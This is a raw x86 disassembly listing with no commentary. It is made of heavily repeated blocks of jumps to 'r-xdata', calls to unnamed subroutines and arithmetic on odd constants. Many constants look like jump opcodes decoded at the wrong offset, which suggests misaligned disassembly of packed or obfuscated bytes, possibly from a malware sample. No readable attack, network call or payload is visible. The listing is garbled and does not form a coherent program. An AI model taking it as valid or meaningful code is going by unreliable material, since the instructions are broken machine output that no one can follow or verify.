pop ecx
jns r-xdata
push esp
push eax
call sub_402f74
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13e0f
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402f74
pop edx
add esp 0x4
jne r-xdata
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
xor edi 0xaae85157
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
add esp 0x4
jno r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_402f74
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b47f
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13e0f
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
jo 0xffffffff894f8935
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_402f8d
jae r-xdata
jne r-xdata
sub ecx 0xe89c579c
jb r-xdata
jne r-xdata
sub edi 0x4c4835a
jne r-xdata
pop edx
pop ecx
pop eax
jae r-xdata
mov ecx 0xf6811c75
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
xor edi 0xaae85157
jg r-xdata
add esi 0x808f0f5a
add [ eax ] al
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd3eb7
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
jg r-xdata
jno 0xf9a8921
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push edi
push ecx
call sub_402f2d
add edx 0xff05e852
jne 0xffffffffc2c15d31
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
add esp 0x4
jno r-xdata
push ebp
pushfd
push eax
pushfd
add ebx 0xdc7f585a
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_402f74
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b47f
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13e0f
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
jo 0xffffffff894f8935
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_403048
sub esp 0x14
push ebp
push edi
push esp
sub esp 0x8
call sub_4030f3
jns 0xffffffff9cc13fb5
add [ eax ] al
add [ 0xffffffff850f595a ] cl
jns r-xdata
jmp 0x10018d3
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
push eax
push ecx
sub esp 0x10
call sub_4030ef
jo 0xffffffffff29beb0
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753de1
jae r-xdata
or eax 0x15ff2875
push esi
call sub_40313e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c340aa
jns r-xdata
add ebx 0x9c575756
jae r-xdata
or eax 0x8d0fb671
jne r-xdata
call 0xffffffffcec17337
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bb019
jae r-xdata
jl 0xffffffffa1a4c353
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_40310d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14027
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e47a
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
pop ecx
add eax 0xfefc8d0f
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1ce5e
jg r-xdata
jge 0x18ab6c8
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jno r-xdata
xor eax 0xff56850f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jg r-xdata
jge 0xffffffffc009a6de
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jg r-xdata
jl 0xe24a497
add esp 0x4
ja r-xdata
jge 0x100b566
jns r-xdata
add esi 0x99870f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f40c
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jns r-xdata
xor esi 0x76795a59
jb 0x120b503
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jo 0xc64762c
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jge r-xdata
call sub_403100
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c149bf
jae r-xdata
jpo 0x36288a05
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288a55
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
or eax 0x850f595a
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba5aa
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13ba35
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_4030ef
jge r-xdata
add esp 0x8
jge 0xffffffff874fe36c
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jg r-xdata
jge r-xdata
js 0x59753de1
jae r-xdata
or eax 0x15ff2875
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c340aa
jns r-xdata
add ebx 0x9c575756
jae r-xdata
jo 0xc64762c
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
call 0xffffffffcec17337
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85bb019
jae r-xdata
jl 0xffffffffa1a4c353
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
jae r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jge r-xdata
call sub_403100
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
push es
jno r-xdata
mov esp 0xd2775a59
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_40310d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14027
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e47a
push esi
call sub_40313e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jg r-xdata
jge 0x18ab6c8
sub esp 0x1c
jge r-xdata
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x10018d3
push eax
push ecx
sub esp 0x10
call sub_4030ef
jo 0xffffffffff29beb0
or esi 0xf04c483
xor ebp 0xfffffffe
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pop ecx
add eax 0xfefc8d0f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
or eax 0x8d0fb671
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1ce5e
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
add esp 0x4
ja r-xdata
jge 0x100b566
jns r-xdata
add esi 0x99870f
jno r-xdata
xor eax 0xff56850f
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f40c
jg r-xdata
jge 0xffffffffc009a6de
jns r-xdata
xor esi 0x76795a59
jb 0x120b503
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xe24a497
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c149bf
jae r-xdata
jpo 0x36288a05
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288a55
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba5aa
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13ba35
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_4030f3
jne r-xdata
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e47a
pop ecx
pop edx
ja r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jne r-xdata
ja 0xffffffffe85bb019
jge r-xdata
sub edx 0xf281e771
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1ce5e
jns r-xdata
add ebx 0x9c575756
call sub_40310d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14027
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c340aa
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jno r-xdata
xor eax 0xff56850f
push esi
call sub_40313e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jne r-xdata
jl 0xffffffffa1a4c353
jg r-xdata
jge 0x18ab6c8
pop ecx
add eax 0xfefc8d0f
jg r-xdata
jge 0xffffffffc009a6de
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x10018d3
push eax
push ecx
sub esp 0x10
call sub_4030ef
jo 0xffffffffff29beb0
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59753de1
jae r-xdata
or eax 0x15ff2875
pop ecx
jae r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jg r-xdata
jl 0xe24a497
jae r-xdata
or eax 0x8d0fb671
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
call 0xffffffffcec17337
jno r-xdata
add ecx 0x8d0f3a7d
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100b566
jns r-xdata
add esi 0x99870f
jae r-xdata
jo 0xc64762c
jne r-xdata
xor edi 0x5c775a59
pop eax
jg r-xdata
jne 0xffffffffe7c21fb0
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f40c
jge r-xdata
call sub_403100
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
xor esi 0x76795a59
jb 0x120b503
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jae r-xdata
or esi 0x937f5959
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c149bf
jae r-xdata
jpo 0x36288a05
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7288a55
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_40328f
call [ 0xfffffffff281d277 ]
je 0xffffffffff82bbbb
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_4031bd
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba5aa
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a8a1a
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_4032c8
sub esi 0xe92e7f58
push esp
push edi
call sub_4031ea
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13ba35
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_403100
jno r-xdata
pop ecx
pop ecx
jg r-xdata
xor edx 0x59bc4079
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e47a
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1ce5e
jns r-xdata
add ebx 0x9c575756
jne r-xdata
xor edi 0x5c775a59
pop edx
ja r-xdata
pop ecx
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
pop edx
jne r-xdata
ja 0xffffffffe85bb019
jge r-xdata
sub edx 0xf281e771
jno r-xdata
xor eax 0xff56850f
push esi
call sub_40313e
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jae r-xdata
or esi 0x937f5959
call sub_40310d
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c14027
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jg r-xdata
jge 0xffffffffc009a6de
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x10018d3
push eax
push ecx
sub esp 0x10
call sub_4030ef
jo 0xffffffffff29beb0
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59753de1
jae r-xdata
or eax 0x15ff2875
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c340aa
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jg r-xdata
jl 0xe24a497
jae r-xdata
or eax 0x8d0fb671
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
jne r-xdata
jl 0xffffffffa1a4c353
jg r-xdata
jge 0x18ab6c8
pop ecx
add eax 0xfefc8d0f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jg r-xdata
sub ecx 0xce819d75
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
call 0xffffffffcec17337
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
jo 0xc64762c
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_40326c
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
